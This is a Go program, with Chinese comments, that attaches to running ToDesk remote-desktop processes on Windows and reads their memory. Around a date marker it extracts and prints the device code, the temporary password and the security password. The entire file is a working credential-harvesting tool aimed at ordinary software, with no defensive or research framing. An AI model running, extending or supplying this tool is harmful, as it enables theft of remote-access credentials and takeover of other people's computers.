package main

import (
	"encoding/hex"
	"fmt"
	"regexp"
	"strings"
	"time"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows"
)

// 定义常量
const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

// 打开进程以获取句柄，返回进程句柄和错误信息
func openProcess(pid int32) (windows.Handle, error) {
	handle, err := windows.OpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return 0, err
	}
	return handle, nil
}

// 读取指定进程内存
func readMemory(handle windows.Handle, address uintptr, size uint32) ([]byte, error) {
	buffer := make([]byte, size)
	var bytesRead uintptr
	err := windows.ReadProcessMemory(handle, address, &buffer[0], uintptr(size), &bytesRead)
	if err != nil {
		return nil, fmt.Errorf("读取内存失败: %v", err)
	}
	return buffer, nil
}

// 搜索进程内存中的指定字节模式
func searchMemory(handle windows.Handle, pattern []byte) ([]uintptr, error) {
	var results []uintptr
	var memoryInfo windows.MemoryBasicInformation

	address := uintptr(0)
	for {
		// 查询进程的内存信息
		err := windows.VirtualQueryEx(handle, address, &memoryInfo, unsafe.Sizeof(memoryInfo))
		if err != nil || memoryInfo.RegionSize == 0 {
			break
		}

		// 只搜索可读写的提交内存块
		if memoryInfo.State == windows.MEM_COMMIT && (memoryInfo.Protect&windows.PAGE_READWRITE) != 0 {
			data, err := readMemory(handle, memoryInfo.BaseAddress, uint32(memoryInfo.RegionSize))
			if err == nil {
				// 在内存块中查找匹配的字节模式
				for i := 0; i < len(data)-len(pattern); i++ {
					if matchPattern(data[i:i+len(pattern)], pattern) {
						results = append(results, memoryInfo.BaseAddress+uintptr(i))
					}
				}
			}
		}
		// 移动到下一个内存块
		address = memoryInfo.BaseAddress + uintptr(memoryInfo.RegionSize)
	}

	return results, nil
}

// 检查字节序列是否匹配
func matchPattern(data, pattern []byte) bool {
	for i := range pattern {
		if data[i] != pattern[i] {
			return false
		}
	}
	return true
}

// 提取两个字符串之间的文本
func extractBetween(value, startDelim, endDelim string) string {
	start := strings.Index(value, startDelim)
	if start == -1 {
		return ""
	}
	start += len(startDelim)

	end := strings.Index(value[start:], endDelim)
	if end == -1 {
		return ""
	}

	return value[start : start+end]
}

// 根据进程名称检查进程是否存在并获取所有匹配的 PID
func getPIDsByName(name string) ([]int32, error) {
	processes, err := process.Processes()
	if err != nil {
		return nil, fmt.Errorf("无法获取进程列表: %v", err)
	}

	var pids []int32
	for _, proc := range processes {
		procName, err := proc.Name()
		if err != nil {
			continue
		}

		// 忽略大小写检查进程名称
		if strings.EqualFold(procName, name) {
			pids = append(pids, proc.Pid)
		}
	}

	if len(pids) == 0 {
		return nil, nil
	}

	return pids, nil
}

// 检查进程是否存在，返回存在的标志和进程 ID 列表
func isProcessExist(name string) (bool, []int32) {
	pids, err := getPIDsByName(name)
	if err != nil {
		fmt.Printf("检查进程时出错: %v\n", err)
		return false, nil
	}

	if len(pids) == 0 {
		return false, nil
	}

	return true, pids
}

// 提取当前日期并格式化为 "YYYYMMDD" 字符串
func getCurrentDateString() string {
	return time.Now().Format("20060102")
}

// 将字符串转换为十六进制格式
func stringToHex(s string) string {
	hexStr := ""
	for _, c := range s {
		hexPart := fmt.Sprintf("%02x", c)
		hexStr += hexPart

		// 检查是否达到了 `000000000c` 或指定的其他限制
		if strings.Contains(hexStr, "000000000c") || strings.Contains(hexStr, "0000000000000009") ||
			strings.Contains(hexStr, "000000000000000f") || strings.Contains(hexStr, "000000000000000a") ||
			strings.Contains(hexStr, "000000000000000d") || strings.Contains(hexStr, "0000000000000020") {
			break
		}
	}
	return hexStr
}

// 将十六进制字符串转换回普通字符串
func hexToString(hexStr string) (string, error) {
	bytes, err := hex.DecodeString(hexStr)
	if err != nil {
		return "", fmt.Errorf("十六进制转换为字符串失败: %v", err)
	}
	return string(bytes), nil
}

// 编译好的正则表达式，避免每次重复编译
var (
	numberPattern       = regexp.MustCompile(`\b\d{9}\b`)             // 9位纯数字模式
	alphanumPattern     = regexp.MustCompile(`\b[a-z0-9]{8}\b`)       // 8位小写字母+数字
	safePasswordPattern = regexp.MustCompile(`\b[a-zA-Z\d\W_]{8,}\b`) // 8位及以上安全密码
)

// 扫描 ToDesk 进程内存，提取设备代码和密码
func todesk(IDArray []int32) {
	// 获取当前日期并作为模式
	currentDate := getCurrentDateString()
	pattern := []byte(currentDate)

	for _, PID := range IDArray {
		// 动态获取进程名
		proc, err := process.NewProcess(PID)
		if err != nil {
			fmt.Println("获取进程信息失败:", err)
			continue
		}

		// 获取进程名和服务名
		procName, _ := proc.Name()
		cmdline, _ := proc.Cmdline()

		// 忽略 ToDesk_Service 进程
		if strings.Contains(procName, "ToDesk.exe") && strings.Contains(cmdline, "ToDesk_Service") {
			fmt.Printf("忽略 ToDesk_Service 进程 PID: %d\n", PID)
			continue
		}

		handle, err := openProcess(PID)
		if err != nil {
			fmt.Println(err)
			continue
		}
		// 每次打开进程后确保关闭句柄，避免资源泄漏
		defer windows.CloseHandle(handle)

		// 搜索内存中的日期模式
		IDs, err := searchMemory(handle, pattern)
		if err != nil {
			fmt.Println("搜索失败:", err)
			continue
		}

		// 遍历搜索到的地址
		for _, id := range IDs {
			startAddress := id - 250
			if startAddress < 0 {
				startAddress = 0
			}
			data, err := readMemory(handle, startAddress, 300)
			if err != nil {
				fmt.Printf("读取内存失败: %v\n", err)
				continue
			}

			dataStr := string(data)

			// 查找9位数字
			number := numberPattern.FindString(dataStr)
			if number != "" {
				fmt.Println("设备代码: ", number)
			}

			// 查找8位小写字母+数字
			alphanum := alphanumPattern.FindString(dataStr)
			if alphanum != "" {
				fmt.Println("临时密码: ", alphanum)
				// 在第一个密码之后继续搜索
				postFirstAlphanumData := dataStr[strings.Index(dataStr, alphanum)+len(alphanum):]
				// 匹配安全密码
				safePassword := safePasswordPattern.FindString(postFirstAlphanumData)
				if safePassword != "" {
					hexSafePassword := stringToHex(safePassword)
					originalString, err := hexToString(hexSafePassword)
					if err != nil {
						fmt.Println("安全密码解析失败:", err)
						continue
					}
					fmt.Printf("安全密码: %s\n", originalString)
				}
				break
			}
		}
	}
}

func main() {
	// 检查 ToDesk 进程
	exists, pids := isProcessExist("ToDesk.exe")
	if !exists {
		fmt.Println("ToDesk 进程未运行")
		return
	}

	// 调用扫描函数
	todesk(pids)
}
